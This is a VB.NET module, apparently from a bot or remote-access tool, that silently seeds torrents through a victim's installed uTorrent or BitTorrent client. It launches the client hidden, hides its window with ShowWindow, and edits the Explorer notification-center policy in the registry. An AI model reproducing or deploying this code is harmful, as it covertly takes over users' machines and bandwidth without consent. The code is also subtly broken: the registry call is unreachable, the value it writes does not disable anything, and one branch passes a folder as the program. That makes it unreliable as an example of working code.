Imports System.Threading
Imports System.IO
Imports System.Runtime.InteropServices
Imports Microsoft.Win32
'-------------------
'| Original Code: KFC
'| Modified for Windows 10
'---------------
Namespace Other
    Public Module TorrentSeeder
        <DllImport("user32.dll")> Private Function ShowWindow(ByVal hwnd As Integer, ByVal nCmdShow As Integer) As Integer
        End Function
        Public UTorrentPath As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\uTorrent\uTorrent.exe"
        Public UTorrentLocalPath As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\uTorrent\"
        Public BitTorrentPath As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\BitTorrent\bittorrent.exe"
        Public BitLocalPath As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\BitTorrent\"
        Public Function SeedTorrent(ByVal path As String)
            On Error Resume Next
            If IsBitTorrent() Then
                SeedIt(BitLocalPath, BitLocalPath, path)
                Return True
            ElseIf IsUtorrent() Then
                SeedIt(UTorrentPath, UTorrentLocalPath, path)
                Return True
            Else
                Return False
            End If

            DisableActionCenter()
        End Function
        Public Function GetFileNameFromURL(ByVal URL As String) As String
            Try
                Return URL.Substring(URL.LastIndexOf("/", System.StringComparison.Ordinal) + 1)
            Catch ex As Exception
                Return URL
            End Try
        End Function
        Public Function IsUtorrent() As Boolean
            On Error Resume Next
            If Directory.Exists(UTorrentLocalPath) Then
                Return True
            End If
            Return False
        End Function
        Public Function IsBitTorrent() As Boolean
            On Error Resume Next
            If Directory.Exists(BitLocalPath) Then
                Return True
            End If
            Return False
        End Function
        Public Sub SeedIt(ByVal ClientPath As String, ByVal LocalPath As String, ByVal TorrentPath As String)
            On Error Resume Next
            Dim seed As New ProcessStartInfo()
            seed.FileName = ClientPath
            seed.Arguments = "/DIRECTORY " & LocalPath & " " & """" & TorrentPath & """"
            seed.CreateNoWindow = True
            seed.WindowStyle = ProcessWindowStyle.Hidden
            Dim p As Process = Process.Start(seed)
            If ClientPath.Contains("uTorrent") Then
                HideIt("uTorrent")
            Else
                HideIt("BitTorrent")
            End If
        End Sub
        Public Sub HideIt(ByVal TorrentClient As String)
            On Error Resume Next
            Thread.Sleep(1000)
            Dim P As Process() = Process.GetProcessesByName(TorrentClient)
            ShowWindow(P(0).MainWindowHandle.ToInt32, 0)
        End Sub
        Public Sub DisableActionCenter()
            Dim Registry As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser
            Dim Key As Microsoft.Win32.RegistryKey = Registry.OpenSubKey("Software\Policies\Microsoft\Windows\Explorer", True)
            Key.SetValue("DisableNotificationCenter", 0, Microsoft.Win32.RegistryValueKind.DWord)
        End Sub
        Public Sub EnableActionCenter()
            Dim Registry As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser
            Dim Key As Microsoft.Win32.RegistryKey = Registry.OpenSubKey("Software\Policies\Microsoft\Windows\Explorer", True)
            Key.DeleteValue("DisableNotificationCenter")
        End Sub
    End Module

End Namespace